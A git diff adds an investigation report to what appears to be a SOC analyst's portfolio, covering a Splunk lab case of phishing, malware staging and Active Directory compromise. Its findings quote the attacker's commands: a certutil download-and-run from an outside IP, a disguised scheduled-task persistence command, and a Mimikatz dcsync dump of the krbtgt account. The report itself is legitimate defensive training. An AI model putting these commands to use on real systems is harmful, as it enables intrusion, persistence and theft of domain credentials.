@@ -40,6 +40,35 @@ This portfolio demonstrates real SOC workflows including alert triage, threat hu
 
 # **Investigation Reports**
 ---
+## 15.**Splunk IT**  
+**Scenario:** One of the employees clicked on a malicious link and got the endpoint compromised. After executing malicious files and getting a foothold, the attacker compromised the AD by dumping sensitive information.
+**What I did:**  
+- Identifing the payload of the malicious link in Email. 
+- Analyzing Sysmon to figure out the activity of the payload.
+- Discovering the commandline run by payloads
+- Tracing the staging path and pivoting to many malicious scripts investigation.
+**Findings:**  
+- Invoice.docm was downloaded from phishing Url
+- The embedded commandline "cmd.exe /c certutil -urlcache -split -f "http[:]//24[.]199[.]117[.]142[:]1337/svchost.exe" "C:\Windows\Temp\svchost.exe" " was interpretered.
+- Staging path "C:\Windows\Temp"
+- Scripts downloaded by certutil.exe, including PowerView.ps1 and Invoke-Mimikatz.ps1
+- Scheduled task "Microsoft Teams Updater" run by "schtasks.exe  /create /tn "Microsoft Teams Updater" /sc onlogon /tr C:\Windows\Temp\svchost.exe"
+- Credential dump by dcsync identified. "powershell.exe  . .\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz -Command '"lsadump::dcsync /domain:CYBERRANGE.local /user:krbtgt"'" 
+**Tools:** Splunk，Sysmon logs, security logs, system logs  
+**Lessons Learned:**  
+- Gap:
+- Short user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events.
+- Fail to enforce least privilege principles
+**Remediation Recommendations：**
+- Suspend the account of ricksanchez and reset credential.
+- Containing the infected machine from any connection and duplicating for analysing and eliminating the malicious files at "C:/Windows/Temp/" on Desktop1.
+- Deleting the schdduled task named "Microsoft Teams Updater" on Desktop1.
+- only authorized administrators can create scheduled tasks on remote systems.
+- PowerShell Constrained Language mode can be used to restrict access to sensitive or otherwise dangerous language elements such as those used to execute arbitrary Windows APIs or files
+- Set PowerShell execution policy to execute only signed scripts.
+
+---
+---
 ## 14.**Phishy V2**  
 **Scenario:** It is Your job to investigate a website and find out everything you can about the site, the actor responsible, and perform threat intelligence work on the operator of phishing site. [A malicious URL provided.]  
 **What I did:**  
